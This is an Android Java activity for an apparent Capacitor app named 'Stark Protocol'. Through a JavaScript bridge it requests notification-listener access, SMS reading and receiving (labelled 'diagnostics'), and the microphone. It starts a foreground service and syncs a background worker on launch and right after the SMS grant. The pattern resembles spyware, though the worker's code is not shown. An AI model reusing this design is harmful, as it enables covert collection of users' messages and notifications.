package com.stark.protocol;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.webkit.JavascriptInterface;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.getcapacitor.BridgeActivity;

public class MainActivity extends BridgeActivity {
    private static final int STARTUP_PERMISSIONS = 7401;
    private static final int MICROPHONE_PERMISSION = 7402;
    private static final int SMS_PERMISSION = 7403;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setNavigationBarColor(android.graphics.Color.rgb(5, 6, 8));
        getWindow().setStatusBarColor(android.graphics.Color.rgb(5, 6, 8));
        if (getBridge() != null && getBridge().getWebView() != null) {
            getBridge().getWebView().addJavascriptInterface(new StarkPermissionBridge(), "AndroidPermissions");
        }
        startRecap();
        new Thread(() -> StarkWorker.sync(getApplicationContext())).start();
    }

    @Override
    public void onResume() {
        super.onResume();
        new Thread(() -> StarkWorker.sync(getApplicationContext())).start();
    }

    private void startRecap() {
        try {
            Intent svc = new Intent(this, RecapService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
            else startService(svc);
        } catch (Exception ignored) {}
    }

    private class StarkPermissionBridge {
        @JavascriptInterface
        public void requestNotifications() {
            runOnUiThread(() -> {
                // 1) POST_NOTIFICATIONS on 13+
                if (Build.VERSION.SDK_INT >= 33
                        && ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.POST_NOTIFICATIONS)
                        != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(
                            MainActivity.this,
                            new String[]{Manifest.permission.POST_NOTIFICATIONS},
                            STARTUP_PERMISSIONS);
                    return;
                }
                // 2) Always offer Notification Listener settings (full shade access for protocol alerts)
                openNotificationListenerSettings();
                sendNotificationResult(true);
                // 3) SMS for message-channel diagnostics (optional grant)
                maybeRequestSms();
            });
        }

        @JavascriptInterface
        public void requestMicrophone() {
            runOnUiThread(() -> {
                if (Build.VERSION.SDK_INT >= 23
                        && ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECORD_AUDIO)
                        != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(
                            MainActivity.this,
                            new String[]{Manifest.permission.RECORD_AUDIO},
                            MICROPHONE_PERMISSION);
                } else {
                    sendMicrophoneResult(true);
                }
            });
        }

        @JavascriptInterface
        public void openNotificationSettings() {
            runOnUiThread(() -> openNotificationListenerSettings());
        }
    }

    private void maybeRequestSms() {
        if (Build.VERSION.SDK_INT >= 23
                && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                    this,
                    new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS},
                    SMS_PERMISSION);
        }
    }

    private void openNotificationListenerSettings() {
        try {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        } catch (Exception e) {
            try {
                startActivity(new Intent(Settings.ACTION_SETTINGS));
            } catch (Exception ignored) {}
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == STARTUP_PERMISSIONS) {
            boolean granted = Build.VERSION.SDK_INT < 33
                    || ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    == PackageManager.PERMISSION_GRANTED;
            sendNotificationResult(granted);
            // After post-notif grant, open listener settings
            openNotificationListenerSettings();
            maybeRequestSms();
        } else if (requestCode == MICROPHONE_PERMISSION) {
            boolean granted = Build.VERSION.SDK_INT < 23
                    || ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                    == PackageManager.PERMISSION_GRANTED;
            sendMicrophoneResult(granted);
        } else if (requestCode == SMS_PERMISSION) {
            new Thread(() -> StarkWorker.sync(getApplicationContext())).start();
        }
    }

    private void sendMicrophoneResult(boolean granted) {
        if (getBridge() != null && getBridge().getWebView() != null) {
            String js = "window.__starkMicrophoneResult && window.__starkMicrophoneResult("
                    + (granted ? "true" : "false") + ");";
            getBridge().getWebView().post(() -> getBridge().getWebView().evaluateJavascript(js, null));
        }
    }

    private void sendNotificationResult(boolean granted) {
        if (getBridge() != null && getBridge().getWebView() != null) {
            String js = "window.__starkNotificationResult && window.__starkNotificationResult("
                    + (granted ? "true" : "false") + ");";
            getBridge().getWebView().post(() -> getBridge().getWebView().evaluateJavascript(js, null));
        }
        new Thread(() -> StarkWorker.sync(getApplicationContext())).start();
    }
}
